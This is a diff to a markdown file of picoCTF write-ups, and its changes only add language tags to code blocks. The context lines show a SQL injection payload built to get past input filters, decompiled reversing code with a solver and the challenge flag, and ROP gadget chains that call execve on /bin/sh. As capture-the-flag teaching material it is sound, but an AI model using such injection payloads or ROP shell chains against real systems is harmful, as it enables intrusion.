@@ -41,7 +41,7 @@ There are 5 rounds in total, and as you can expect, each level will filter more 
 
 I will leave this final payload which will bypass all the filters in the 5 rounds here:
 
-```
+```sql
 '/**/||/**/X'61646D'/**/||/**/X'696E'%00
 ```
 
@@ -54,7 +54,7 @@ After round 5, submit the request again then visit `filter.php` and the source c
 
 Source:
 
-```
+```html
  <?php
 session_start();
 
@@ -123,7 +123,7 @@ First, let's load this binary up in ghidra. The flag text file is full of hex nu
 
 #### main
 
-```
+```c
 undefined8 main(int param_1,undefined8 *param_2)
 
 {
@@ -197,7 +197,7 @@ Then it copies the user input into some buffer. And it does a bunch of magic ope
 
 Here is the first operation:
 
-```
+```c
     while( true ) {
       uVar3 = valid_char(local_e8[(long)local_f0]);
       if ((int)uVar3 == 0) break;
@@ -220,7 +220,7 @@ It's doing a while loop, iterating through all the characters in the string, and
 
 #### jumble
 
-```
+```c
 ulong jumble(char param_1)
 
 {
@@ -251,7 +251,7 @@ Finally, it checks `local_c > 0xf`, if so, `local_c += 1`, and return `local_c`.
 And now `jumble` function is understood, let's not reverse it just yet and continue. In the decompiled code above, the input buffer is called `local_84`, and in the first while loop, for each new character output, is put into a new buffer called `local_78`. We will come back to the reverse part later, but first let's understand the basic flow of the binary.
 Then comes the second while loop.
 
-```
+```c
     local_ec = 0;
     while (local_ec < local_f0) {
       local_78[(long)local_ec] = local_78[(long)local_ec] + 'a';
@@ -263,7 +263,7 @@ This time it iterate through this `local_78` buffer, and `local_78[i] += charCod
 
 The final comparison:
 
-```
+```c
     if (local_f0 == 100) {
       iVar2 = strncmp(local_78,
                       "occdpnkibjefihcgjanhofnhkdfnabmofnopaghhgnjhbkalgpnpdjonblalfciifiimkaoenpealibelmkdpbdlcldicplephbo"
@@ -293,7 +293,7 @@ picoCTF{cust0m_jumbl3s_4r3nt_4_g0Od_1d3A_15e89ca4}
 
 #### sol.py
 
-```
+```python
 char_set = '0123456789abcdef'
 
 def jumble(ch):
@@ -361,7 +361,7 @@ I made a simple game to show off my programming skills. See if you can beat it! 
 
 Here is the `vuln.c` file.
 
-```
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -450,7 +450,7 @@ No NX, no plt, no got, no thank you. So it's gonna be some kind of ROP which wil
 
 There are a bunch of syscalls out there, and we want this `execve` to execute commands. [Here](https://filippo.io/linux-syscall-table/) to find the exact syscall number. `execve` takes three arguments according to its man page.
 
-```
+```c
 int execve(const char *filename, char *const argv[], char *const envp[]);
 ```
 
@@ -474,7 +474,7 @@ And pick a random address, doesn't really matter.
 
 So now I have everything I need, I can construct the write gadget.
 
-```
+```asm
 pop rsi ; ret + address of /bin/sh +
 pop rax ; ret + '/bin/sh\x00' +
 mov qword ptr [rsi], rax ; ret +
@@ -483,7 +483,7 @@ xor rax, rax ; ret
 
 Then we need to find the syscall gadget and the argument ones. Use `ROPgadget` or `ropper` whichever you like, and find `pop rdi`, `pop rsi`, `pop rdx`, and `syscall`. Then the command execution gadget should be like:
 
-```
+```asm
 pop rdi ; ret + address of '/bin/sh' +
 pop rsi ; ret + address of '/bin/sh' +
 pop rdx ; ret + 0x0 (because no envp) +
@@ -495,7 +495,7 @@ And with that, conrtsuct the exploit and get shell. But before that, we need to 
 
 #### exp.py
 
-```
+```python
 #!/usr/bin/env python3
 
 import struct
